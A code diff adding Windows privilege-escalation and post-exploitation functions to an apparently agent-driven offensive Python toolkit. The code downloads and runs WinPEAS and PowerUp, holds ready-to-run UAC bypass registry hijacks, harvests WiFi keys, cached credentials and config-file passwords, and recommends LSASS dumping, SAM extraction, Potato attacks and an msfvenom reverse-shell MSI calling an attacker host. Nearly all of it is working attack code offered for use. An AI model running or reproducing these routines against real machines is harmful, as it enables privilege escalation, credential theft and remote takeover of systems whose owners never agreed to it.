@@ -441,3 +441,873 @@ def _get_windows_system_info() -> Dict[str, str]:
             info[key] = result.get("output", "").strip()
 
     return info
+
+
+# ============================================================================
+# ENHANCED WINDOWS PRIVILEGE ESCALATION TOOLS (Phase 15)
+# ============================================================================
+# Added: January 22, 2025
+# Purpose: Complete Windows privilege escalation capability matching Linux tools
+# ============================================================================
+
+
+def run_winpeas(
+    output_file: str = "C:\\temp\\winpeas.txt",
+    thorough: bool = False,
+    quiet: bool = False
+) -> Dict[str, Any]:
+    """
+    Execute WinPEAS (Windows Privilege Escalation Awesome Script).
+
+    Downloads and runs WinPEAS, parses output for critical findings including:
+    - System information and patches
+    - User privileges and groups
+    - Scheduled tasks vulnerabilities
+    - Service misconfigurations
+    - Registry keys with sensitive data
+    - Network information
+    - Installed applications
+    - Credentials in files
+
+    Args:
+        output_file: Path to save WinPEAS output (default: C:\\temp\\winpeas.txt)
+        thorough: Run thorough scan (slower but more comprehensive)
+        quiet: Suppress colored output for easier parsing
+
+    Returns:
+        Dictionary containing:
+        - critical_findings: List of critical security issues
+        - credentials_found: Any credentials discovered
+        - misconfigurations: Registry and service misconfigurations
+        - exploitable_services: Services with weak permissions
+        - recommendations: Suggested exploitation paths
+
+    Example:
+        >>> # Basic WinPEAS scan
+        >>> results = run_winpeas()
+        >>> for finding in results['critical_findings']:
+        ...     print(f"[!] {finding}")
+
+        >>> # Thorough scan with custom output
+        >>> results = run_winpeas(
+        ...     output_file="C:\\temp\\winpeas_detailed.txt",
+        ...     thorough=True
+        ... )
+
+        >>> # Quick scan for CTF
+        >>> results = run_winpeas(quiet=True)
+        >>> if results['credentials_found']:
+        ...     print(f"Credentials: {results['credentials_found']}")
+
+    Primary Users:
+    - T-800 Infiltrator (Alpha-Red): Windows exploitation
+    - CTF Master (Alpha-Crimson): CTF Windows targets
+    - T-1000 Hunter (Alpha-Gold): Vulnerability research
+    """
+    import subprocess
+    import os
+
+    results = {
+        "success": False,
+        "critical_findings": [],
+        "credentials_found": [],
+        "misconfigurations": [],
+        "exploitable_services": [],
+        "recommendations": [],
+        "output_file": output_file,
+        "error": None
+    }
+
+    try:
+        # WinPEAS download URL
+        winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
+        winpeas_local = "C:\\temp\\winpeas.exe"
+
+        # Create temp directory if it doesn't exist
+        os.makedirs("C:\\temp", exist_ok=True)
+
+        # Download WinPEAS
+        print("[*] Downloading WinPEAS...")
+        download_cmd = f'powershell -Command "Invoke-WebRequest -Uri {winpeas_url} -OutFile {winpeas_local}"'
+
+        download_result = subprocess.run(
+            download_cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+
+        if download_result.returncode != 0:
+            results["error"] = "Failed to download WinPEAS"
+            return results
+
+        # Build WinPEAS command
+        cmd_parts = [winpeas_local]
+
+        if quiet:
+            cmd_parts.append("quiet")
+
+        if thorough:
+            cmd_parts.append("full")
+
+        cmd_parts.append(f"> {output_file}")
+
+        cmd = " ".join(cmd_parts)
+
+        print(f"[*] Running WinPEAS...")
+
+        # Execute WinPEAS
+        winpeas_result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=600  # 10 minute timeout for thorough scan
+        )
+
+        # Read output file
+        if os.path.exists(output_file):
+            with open(output_file, 'r', encoding='utf-8', errors='ignore') as f:
+                output = f.read()
+
+            # Parse output for critical findings
+            lines = output.split('\n')
+
+            for i, line in enumerate(lines):
+                line_lower = line.lower()
+
+                # Critical findings patterns
+                if any(pattern in line_lower for pattern in ['[!]', 'exploitable', 'misconfigured', 'weak']):
+                    results["critical_findings"].append(line.strip())
+
+                # Credential patterns
+                if any(pattern in line_lower for pattern in ['password', 'credential', 'apikey', 'token']):
+                    # Look for actual values (not just headers)
+                    if '=' in line or ':' in line:
+                        results["credentials_found"].append(line.strip())
+
+                # Service misconfigurations
+                if 'modifiable service' in line_lower or 'unquoted' in line_lower:
+                    results["exploitable_services"].append(line.strip())
+
+                # Registry misconfigurations
+                if 'alwaysinstallelevated' in line_lower or 'autologon' in line_lower:
+                    results["misconfigurations"].append(line.strip())
+
+            # Generate recommendations based on findings
+            if results["exploitable_services"]:
+                results["recommendations"].append(
+                    "Exploitable services found - check service binary paths and permissions"
+                )
+
+            if results["credentials_found"]:
+                results["recommendations"].append(
+                    "Credentials found - try using them for privilege escalation or lateral movement"
+                )
+
+            if any('alwaysinstallelevated' in m.lower() for m in results["misconfigurations"]):
+                results["recommendations"].append(
+                    "AlwaysInstallElevated enabled - create malicious MSI for privilege escalation"
+                )
+
+            results["success"] = True
+
+        else:
+            results["error"] = "WinPEAS output file not created"
+
+    except subprocess.TimeoutExpired:
+        results["error"] = "WinPEAS execution timed out"
+    except Exception as e:
+        results["error"] = str(e)
+
+    return results
+
+
+def run_powerup() -> Dict[str, Any]:
+    """
+    Execute PowerUp.ps1 privilege escalation checks.
+
+    PowerUp is a PowerShell script that performs common Windows privilege
+    escalation checks including:
+    - Service vulnerabilities (unquoted paths, weak permissions)
+    - Registry auto-logon credentials
+    - AlwaysInstallElevated policy
+    - Scheduled tasks with weak permissions
+    - DLL hijacking opportunities
+
+    Returns:
+        Dictionary containing:
+        - service_vulns: Exploitable service misconfigurations
+        - registry_vulns: Registry-based vulnerabilities
+        - dll_hijacking: DLL hijacking opportunities
+        - autologon_creds: Auto-logon credentials if found
+        - recommendations: Exploitation suggestions
+
+    Example:
+        >>> # Run PowerUp checks
+        >>> results = run_powerup()
+        >>>
+        >>> # Check for service vulnerabilities
+        >>> if results['service_vulns']:
+        ...     print("Exploitable services:")
+        ...     for svc in results['service_vulns']:
+        ...         print(f"  - {svc['name']}: {svc['abuse_function']}")
+        >>>
+        >>> # Check for auto-logon credentials
+        >>> if results['autologon_creds']:
+        ...     print(f"Username: {results['autologon_creds'].get('username')}")
+        ...     print(f"Password: {results['autologon_creds'].get('password')}")
+
+    Primary Users:
+    - T-800 Infiltrator (Alpha-Red): Windows exploitation
+    - CTF Master (Alpha-Crimson): CTF Windows challenges
+    """
+    import subprocess
+    import re
+    import os
+
+    results = {
+        "success": False,
+        "service_vulns": [],
+        "registry_vulns": [],
+        "dll_hijacking": [],
+        "autologon_creds": {},
+        "always_install_elevated": False,
+        "recommendations": [],
+        "error": None
+    }
+
+    try:
+        # PowerUp download URL
+        powerup_url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
+        powerup_local = "C:\\temp\\PowerUp.ps1"
+
+        # Create temp directory
+        os.makedirs("C:\\temp", exist_ok=True)
+
+        # Download PowerUp
+        print("[*] Downloading PowerUp.ps1...")
+        download_cmd = f'powershell -Command "Invoke-WebRequest -Uri {powerup_url} -OutFile {powerup_local}"'
+
+        download_result = subprocess.run(
+            download_cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=60
+        )
+
+        if download_result.returncode != 0:
+            results["error"] = "Failed to download PowerUp"
+            return results
+
+        # Execute PowerUp - Invoke-AllChecks
+        print("[*] Running PowerUp checks...")
+        powerup_cmd = f'powershell -ExecutionPolicy Bypass -File {powerup_local} -Command "Invoke-AllChecks"'
+
+        powerup_result = subprocess.run(
+            powerup_cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=300  # 5 minute timeout
+        )
+
+        output = powerup_result.stdout
+
+        # Parse output for vulnerabilities
+
+        # Service vulnerabilities
+        service_pattern = r'ServiceName\s*:\s*(\S+).*?AbuseFunction\s*:\s*([^\n]+)'
+        for match in re.finditer(service_pattern, output, re.DOTALL):
+            results["service_vulns"].append({
+                "name": match.group(1),
+                "abuse_function": match.group(2).strip()
+            })
+
+        # AlwaysInstallElevated
+        if 'AlwaysInstallElevated' in output and 'Enabled' in output:
+            results["always_install_elevated"] = True
+            results["registry_vulns"].append("AlwaysInstallElevated")
+
+        # Auto-logon credentials
+        username_match = re.search(r'DefaultUserName\s*:\s*(\S+)', output)
+        password_match = re.search(r'DefaultPassword\s*:\s*(\S+)', output)
+
+        if username_match and password_match:
+            results["autologon_creds"] = {
+                "username": username_match.group(1),
+                "password": password_match.group(1)
+            }
+
+        # DLL hijacking
+        dll_pattern = r'ModifiablePath\s*:\s*([^\n]+)'
+        for match in re.finditer(dll_pattern, output):
+            results["dll_hijacking"].append(match.group(1).strip())
+
+        # Generate recommendations
+        if results["service_vulns"]:
+            results["recommendations"].append(
+                f"Found {len(results['service_vulns'])} exploitable services"
+            )
+            results["recommendations"].append(
+                f"Run: {results['service_vulns'][0]['abuse_function']}"
+            )
+
+        if results["always_install_elevated"]:
+            results["recommendations"].append(
+                "AlwaysInstallElevated enabled - create malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > evil.msi"
+            )
+
+        if results["autologon_creds"]:
+            results["recommendations"].append(
+                f"Auto-logon credentials found - try: runas /user:{results['autologon_creds']['username']} cmd.exe"
+            )
+
+        results["success"] = True
+
+    except subprocess.TimeoutExpired:
+        results["error"] = "PowerUp execution timed out"
+    except Exception as e:
+        results["error"] = str(e)
+
+    return results
+
+
+def check_uac_bypasses() -> Dict[str, Any]:
+    """
+    Check for available UAC (User Access Control) bypass techniques.
+
+    Tests for common UAC bypass methods including:
+    - FodHelper (Windows 10)
+    - eventvwr (Event Viewer)
+    - CompMgmtLauncher (Computer Management)
+    - sdclt (Backup and Restore)
+    - SilentCleanup (Disk Cleanup)
+
+    Returns:
+        Dictionary containing:
+        - available_bypasses: List of applicable UAC bypass methods
+        - commands: Ready-to-execute bypass commands
+        - os_version: Windows version for compatibility check
+        - recommendations: Step-by-step exploitation guide
+
+    Example:
+        >>> # Check for UAC bypasses
+        >>> bypasses = check_uac_bypasses()
+        >>>
+        >>> if bypasses['available_bypasses']:
+        ...     print(f"Found {len(bypasses['available_bypasses'])} UAC bypasses:")
+        ...     for bypass in bypasses['available_bypasses']:
+        ...         print(f"  - {bypass['name']} ({bypass['os_version']})")
+        ...         print(f"    Command: {bypass['command']}")
+
+        >>> # Execute first bypass
+        >>> if bypasses['commands']:
+        ...     print(f"Execute: {bypasses['commands'][0]}")
+
+    Primary Users:
+    - T-800 Infiltrator (Alpha-Red): UAC bypass during exploitation
+    - CTF Master (Alpha-Crimson): Windows CTF challenges
+    """
+    import subprocess
+    import re
+
+    results = {
+        "success": False,
+        "available_bypasses": [],
+        "commands": [],
+        "os_version": "",
+        "is_admin": False,
+        "recommendations": [],
+        "error": None
+    }
+
+    try:
+        # Get Windows version
+        ver_result = subprocess.run(
+            "ver",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        results["os_version"] = ver_result.stdout.strip()
+
+        # Check if already admin
+        admin_check = subprocess.run(
+            'net session 2>&1 | find "Access is denied" >nul',
+            shell=True
+        )
+
+        results["is_admin"] = (admin_check.returncode != 0)
+
+        if results["is_admin"]:
+            results["recommendations"].append("Already running as administrator - UAC bypass not needed")
+            results["success"] = True
+            return results
+
+        # Define UAC bypass techniques
+        bypasses = [
+            {
+                "name": "FodHelper",
+                "os_version": "Windows 10",
+                "description": "Fodhelper.exe UAC bypass using registry",
+                "command": 'REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f && REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f && fodhelper.exe',
+                "cleanup": 'REG DELETE HKCU\\Software\\Classes\\ms-settings /f'
+            },
+            {
+                "name": "eventvwr",
+                "os_version": "Windows 7/10",
+                "description": "Event Viewer UAC bypass using registry",
+                "command": 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && eventvwr.exe',
+                "cleanup": 'REG DELETE HKCU\\Software\\Classes\\mscfile /f'
+            },
+            {
+                "name": "CompMgmtLauncher",
+                "os_version": "Windows 10",
+                "description": "Computer Management Launcher bypass",
+                "command": 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe" /f && CompMgmtLauncher.exe',
+                "cleanup": 'REG DELETE HKCU\\Software\\Classes\\mscfile /f'
+            },
+            {
+                "name": "sdclt",
+                "os_version": "Windows 10",
+                "description": "Backup and Restore UAC bypass",
+                "command": 'REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command /d "cmd.exe" /f && REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command /v DelegateExecute /f && sdclt.exe /KickOffElev',
+                "cleanup": 'REG DELETE HKCU\\Software\\Classes\\exefile /f'
+            },
+            {
+                "name": "SilentCleanup",
+                "os_version": "Windows 10",
+                "description": "Disk Cleanup scheduled task bypass",
+                "command": 'REG ADD "HKCU\\Environment" /v "windir" /d "cmd.exe /c REM " /f && schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I',
+                "cleanup": 'REG DELETE "HKCU\\Environment" /v "windir" /f'
+            }
+        ]
+
+        # Check which bypasses are available
+        for bypass in bypasses:
+            # Simple compatibility check based on OS version
+            if "Windows 10" in results["os_version"] or "Windows 7" in bypass["os_version"]:
+                results["available_bypasses"].append(bypass)
+                results["commands"].append(bypass["command"])
+
+        if results["available_bypasses"]:
+            results["recommendations"].append(
+                f"Found {len(results['available_bypasses'])} applicable UAC bypass techniques"
+            )
+            results["recommendations"].append(
+                f"Try: {results['available_bypasses'][0]['name']} bypass"
+            )
+            results["recommendations"].append(
+                f"Execute: {results['commands'][0]}"
+            )
+            results["recommendations"].append(
+                f"Cleanup: {results['available_bypasses'][0]['cleanup']}"
+            )
+
+        results["success"] = True
+
+    except Exception as e:
+        results["error"] = str(e)
+
+    return results
+
+
+def harvest_credentials() -> Dict[str, Any]:
+    """
+    Harvest credentials from Windows system.
+
+    Searches for credentials in multiple locations:
+    - SAM/SYSTEM registry hives (requires SYSTEM)
+    - LSA secrets
+    - Cached domain credentials
+    - WiFi passwords
+    - Browser saved passwords
+    - Credential Manager
+    - Unattend.xml files
+    - Configuration files
+
+    Returns:
+        Dictionary containing:
+        - wifi_passwords: Saved WiFi passwords
+        - cached_credentials: Cached logon credentials
+        - lsa_secrets: LSA secret data (if accessible)
+        - browser_creds: Browser saved credentials
+        - config_creds: Credentials from config files
+        - recommendations: Next steps for credential abuse
+
+    Example:
+        >>> # Harvest all credentials
+        >>> creds = harvest_credentials()
+        >>>
+        >>> # Check WiFi passwords
+        >>> if creds['wifi_passwords']:
+        ...     for wifi in creds['wifi_passwords']:
+        ...         print(f"SSID: {wifi['ssid']}, Password: {wifi['password']}")
+        >>>
+        >>> # Check cached credentials
+        >>> if creds['cached_credentials']:
+        ...     for cred in creds['cached_credentials']:
+        ...         print(f"User: {cred}")
+
+        >>> # Search for specific patterns
+        >>> creds = harvest_credentials()
+        >>> if creds['config_creds']:
+        ...     print(f"Found credentials in {len(creds['config_creds'])} files")
+
+    Primary Users:
+    - T-800 Infiltrator (Alpha-Red): Credential theft
+    - T-1000 Hunter (Alpha-Gold): Post-exploitation
+    - CTF Master (Alpha-Crimson): CTF credential challenges
+    """
+    import subprocess
+    import os
+    import re
+
+    results = {
+        "success": False,
+        "wifi_passwords": [],
+        "cached_credentials": [],
+        "lsa_secrets": [],
+        "browser_creds": [],
+        "config_creds": [],
+        "unattend_files": [],
+        "recommendations": [],
+        "error": None
+    }
+
+    try:
+        # 1. Harvest WiFi passwords
+        print("[*] Extracting WiFi passwords...")
+        wifi_result = subprocess.run(
+            'netsh wlan show profiles',
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if wifi_result.returncode == 0:
+            profiles = re.findall(r'All User Profile\s*:\s*(.+)', wifi_result.stdout)
+
+            for profile in profiles:
+                profile = profile.strip()
+                # Get password for each profile
+                pwd_result = subprocess.run(
+                    f'netsh wlan show profile name="{profile}" key=clear',
+                    shell=True,
+                    capture_output=True,
+                    text=True
+                )
+
+                password_match = re.search(r'Key Content\s*:\s*(.+)', pwd_result.stdout)
+                if password_match:
+                    results["wifi_passwords"].append({
+                        "ssid": profile,
+                        "password": password_match.group(1).strip()
+                    })
+
+        # 2. Check cached credentials
+        print("[*] Checking cached credentials...")
+        cmdkey_result = subprocess.run(
+            'cmdkey /list',
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if cmdkey_result.returncode == 0:
+            creds = re.findall(r'Target:\s*(.+)', cmdkey_result.stdout)
+            results["cached_credentials"] = [c.strip() for c in creds]
+
+        # 3. Search for unattend.xml files
+        print("[*] Searching for unattend.xml files...")
+        unattend_paths = [
+            "C:\\Windows\\Panther\\Unattend.xml",
+            "C:\\Windows\\Panther\\Unattended.xml",
+            "C:\\Windows\\System32\\Sysprep\\unattend.xml",
+            "C:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml"
+        ]
+
+        for path in unattend_paths:
+            if os.path.exists(path):
+                try:
+                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read()
+                        # Look for password tags
+                        passwords = re.findall(r'<Password>(.+?)</Password>', content)
+                        if passwords:
+                            results["unattend_files"].append({
+                                "path": path,
+                                "passwords": passwords
+                            })
+                except:
+                    pass
+
+        # 4. Search common config files for credentials
+        print("[*] Searching configuration files...")
+        search_paths = [
+            "C:\\inetpub\\wwwroot\\web.config",
+            "C:\\xampp\\htdocs\\config.php",
+            "C:\\Program Files\\*\\config.ini",
+            "C:\\Users\\*\\Documents\\*.txt"
+        ]
+
+        credential_patterns = [
+            r'password\s*=\s*["\'](.+?)["\']',
+            r'pwd\s*=\s*["\'](.+?)["\']',
+            r'apikey\s*=\s*["\'](.+?)["\']',
+            r'api_key\s*=\s*["\'](.+?)["\']'
+        ]
+
+        for search_path in search_paths:
+            try:
+                # Use PowerShell to search files
+                ps_cmd = f'Get-ChildItem -Path "{search_path}" -File -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|apikey" | Select-Object -First 10'
+
+                search_result = subprocess.run(
+                    f'powershell -Command "{ps_cmd}"',
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+
+                if search_result.returncode == 0 and search_result.stdout:
+                    results["config_creds"].append({
+                        "search_path": search_path,
+                        "matches": search_result.stdout.strip()
+                    })
+            except:
+                pass
+
+        # Generate recommendations
+        if results["wifi_passwords"]:
+            results["recommendations"].append(
+                f"Found {len(results['wifi_passwords'])} WiFi passwords - potential password reuse"
+            )
+
+        if results["cached_credentials"]:
+            results["recommendations"].append(
+                f"Found {len(results['cached_credentials'])} cached credentials"
+            )
+
+        if results["unattend_files"]:
+            results["recommendations"].append(
+                "Unattend.xml files found with credentials - check for administrator passwords"
+            )
+
+        if results["config_creds"]:
+            results["recommendations"].append(
+                f"Found credentials in {len(results['config_creds'])} configuration files"
+            )
+
+        if not any([results["wifi_passwords"], results["cached_credentials"],
+                    results["unattend_files"], results["config_creds"]]):
+            results["recommendations"].append(
+                "No obvious credentials found - try running as SYSTEM for LSA secrets/SAM dump"
+            )
+
+        results["success"] = True
+
+    except Exception as e:
+        results["error"] = str(e)
+
+    return results
+
+
+def check_token_privileges_enhanced() -> Dict[str, Any]:
+    """
+    Enhanced token privilege checking with exploitation guidance.
+
+    Checks for dangerous Windows token privileges and provides specific
+    exploitation techniques for each, including:
+    - SeImpersonatePrivilege (Potato attacks)
+    - SeAssignPrimaryTokenPrivilege (Token manipulation)
+    - SeDebugPrivilege (Process injection)
+    - SeBackupPrivilege (File system access)
+    - SeRestorePrivilege (Registry modification)
+    - SeLoadDriverPrivilege (Kernel driver loading)
+    - SeTakeOwnershipPrivilege (File ownership)
+
+    Returns:
+        Dictionary containing:
+        - privileges: All current token privileges
+        - dangerous_privileges: Exploitable privileges with details
+        - exploitation_methods: Step-by-step exploitation guides
+        - potato_attacks: Available Potato attack variants
+        - recommendations: Prioritized exploitation paths
+
+    Example:
+        >>> # Check token privileges
+        >>> privs = check_token_privileges_enhanced()
+        >>>
+        >>> if privs['dangerous_privileges']:
+        ...     for priv in privs['dangerous_privileges']:
+        ...         print(f"[!] {priv['name']}: {priv['description']}")
+        ...         print(f"    Exploit: {priv['exploit_method']}")
+        >>>
+        >>> # Check for Potato attacks
+        >>> if privs['potato_attacks']:
+        ...     print(f"Use: {privs['potato_attacks'][0]['command']}")
+
+    Primary Users:
+    - T-800 Infiltrator (Alpha-Red): Token privilege exploitation
+    - CTF Master (Alpha-Crimson): Windows CTF privesc challenges
+    """
+    import subprocess
+
+    results = {
+        "success": False,
+        "privileges": [],
+        "dangerous_privileges": [],
+        "exploitation_methods": {},
+        "potato_attacks": [],
+        "recommendations": [],
+        "error": None
+    }
+
+    try:
+        # Get current privileges
+        priv_result = subprocess.run(
+            'whoami /priv',
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+
+        if priv_result.returncode != 0:
+            results["error"] = "Failed to get token privileges"
+            return results
+
+        output = priv_result.stdout
+        results["privileges"] = output.split('\n')
+
+        # Define dangerous privileges with exploitation details
+        dangerous_privs = {
+            "SeImpersonatePrivilege": {
+                "description": "Impersonate a client after authentication",
+                "exploit_method": "Potato attacks (JuicyPotato, RoguePotato, PrintSpoofer)",
+                "severity": "CRITICAL",
+                "commands": [
+                    "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
+                    "PrintSpoofer.exe -i -c cmd",
+                    "RoguePotato.exe -r <attacker_ip> -e cmd.exe"
+                ]
+            },
+            "SeAssignPrimaryTokenPrivilege": {
+                "description": "Replace a process's primary token",
+                "exploit_method": "Token manipulation with Potato attacks",
+                "severity": "CRITICAL",
+                "commands": ["Similar to SeImpersonatePrivilege - use Potato attacks"]
+            },
+            "SeTcbPrivilege": {
+                "description": "Act as part of the operating system",
+                "exploit_method": "Direct SYSTEM shell creation",
+                "severity": "CRITICAL",
+                "commands": ["psexec -i -s cmd.exe"]
+            },
+            "SeDebugPrivilege": {
+                "description": "Debug and adjust memory of other processes",
+                "exploit_method": "Process injection, LSASS dumping",
+                "severity": "HIGH",
+                "commands": [
+                    "procdump.exe -ma lsass.exe lsass.dmp",
+                    "Invoke-Mimikatz -DumpCreds"
+                ]
+            },
+            "SeBackupPrivilege": {
+                "description": "Backup files and directories",
+                "exploit_method": "Copy sensitive files (SAM, SYSTEM, ntds.dit)",
+                "severity": "HIGH",
+                "commands": [
+                    "reg save HKLM\\SAM sam.save",
+                    "reg save HKLM\\SYSTEM system.save"
+                ]
+            },
+            "SeRestorePrivilege": {
+                "description": "Restore files and directories",
+                "exploit_method": "Modify system files and registry",
+                "severity": "HIGH",
+                "commands": ["Modify critical system files or registry keys"]
+            },
+            "SeLoadDriverPrivilege": {
+                "description": "Load and unload device drivers",
+                "exploit_method": "Load malicious kernel driver for SYSTEM",
+                "severity": "CRITICAL",
+                "commands": ["Use Capcom.sys or similar vulnerable driver"]
+            },
+            "SeTakeOwnershipPrivilege": {
+                "description": "Take ownership of files or objects",
+                "exploit_method": "Take ownership of system files",
+                "severity": "MEDIUM",
+                "commands": [
+                    "takeown /f C:\\Windows\\System32\\config\\SAM",
+                    "icacls C:\\Windows\\System32\\config\\SAM /grant %username%:F"
+                ]
+            }
+        }
+
+        # Check which dangerous privileges are enabled
+        for line in output.split('\n'):
+            for priv_name, priv_info in dangerous_privs.items():
+                if priv_name in line and "Enabled" in line:
+                    priv_data = {
+                        "name": priv_name,
+                        "description": priv_info["description"],
+                        "exploit_method": priv_info["exploit_method"],
+                        "severity": priv_info["severity"],
+                        "commands": priv_info["commands"]
+                    }
+                    results["dangerous_privileges"].append(priv_data)
+                    results["exploitation_methods"][priv_name] = priv_info
+
+                    # Add to Potato attacks if applicable
+                    if priv_name in ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"]:
+                        results["potato_attacks"].append({
+                            "name": "JuicyPotato",
+                            "command": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
+                            "description": "Token manipulation for SYSTEM shell"
+                        })
+                        results["potato_attacks"].append({
+                            "name": "PrintSpoofer",
+                            "command": "PrintSpoofer.exe -i -c cmd",
+                            "description": "Exploit Print Spooler service (Windows 10/Server 2019)"
+                        })
+
+        # Generate recommendations
+        if results["dangerous_privileges"]:
+            # Sort by severity
+            critical = [p for p in results["dangerous_privileges"] if p["severity"] == "CRITICAL"]
+
+            if critical:
+                results["recommendations"].append(
+                    f"[CRITICAL] Found {len(critical)} critical privilege(s): {', '.join([p['name'] for p in critical])}"
+                )
+                results["recommendations"].append(
+                    f"Recommended: {critical[0]['exploit_method']}"
+                )
+                results["recommendations"].append(
+                    f"Execute: {critical[0]['commands'][0]}"
+                )
+
+            if results["potato_attacks"]:
+                results["recommendations"].append(
+                    f"Potato attacks available - {len(results['potato_attacks'])} variants"
+                )
+                results["recommendations"].append(
+                    f"Try: {results['potato_attacks'][0]['command']}"
+                )
+        else:
+            results["recommendations"].append(
+                "No dangerous privileges found - current user has limited token privileges"
+            )
+
+        results["success"] = True
+
+    except Exception as e:
+        results["error"] = str(e)
+
+    return results
